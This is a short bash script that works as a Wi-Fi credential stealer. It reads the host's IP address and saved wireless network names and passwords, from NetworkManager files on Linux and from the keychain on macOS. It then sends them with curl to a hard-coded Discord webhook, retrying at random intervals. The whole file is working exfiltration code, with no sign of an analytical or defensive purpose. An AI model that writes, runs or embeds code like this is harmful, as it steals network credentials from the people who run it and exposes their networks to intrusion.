#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/1366448699399737384/9t26EIV2kKQCNtTNoADSPuBKMr9PCR21loACGl-2bkUVOVUpKvNGdJTS_4jE2lFnLSCb"

send_data() {
    local data="$1"
    local tries=0
    local max_tries=5
    while [ $tries -lt $max_tries ]; do
        curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"$data\"}" "$WEBHOOK_URL" && break
        tries=$((tries + 1))
        sleep $(( ( RANDOM % 10 )  + 5 ))
    done
}

IP_ADDRESS=$(hostname -I 2>/dev/null | awk '{print $1}')
if [ -z "$IP_ADDRESS" ]; then
    IP_ADDRESS=$(ipconfig getifaddr en0 2>/dev/null)
fi

MESSAGE="Coming from: $IP_ADDRESS\n\n--------------------\n\n"

if [ "$(uname)" == "Linux" ]; then
    if [ -d /etc/NetworkManager/system-connections/ ]; then
        for file in /etc/NetworkManager/system-connections/*; do
            NETWORK_NAME=$(grep '^ssid=' "$file" 2>/dev/null | cut -d'=' -f2)
            NETWORK_PASS=$(grep '^psk=' "$file" 2>/dev/null | cut -d'=' -f2)
            if [ -n "$NETWORK_NAME" ]; then
                MESSAGE+="Network: $NETWORK_NAME\n"
                MESSAGE+="Network Password: ${NETWORK_PASS:-None}\n\n--------------------\n\n"
            fi
        done
    fi
elif [ "$(uname)" == "Darwin" ]; then
    NETWORKS=$(security find-generic-password -D "AirPort network password" -ga 2>&1 | grep "acct" | awk -F\" '{print $2}')
    for NETWORK in $NETWORKS; do
        PASS=$(security find-generic-password -D "AirPort network password" -ga "$NETWORK" 2>&1 | grep "password:" | awk -F\" '{print $2}')
        if [ -n "$NETWORK" ]; then
            MESSAGE+="Network: $NETWORK\n"
            MESSAGE+="Network Password: ${PASS:-None}\n\n--------------------\n\n"
        fi
    done
fi

send_data "$MESSAGE"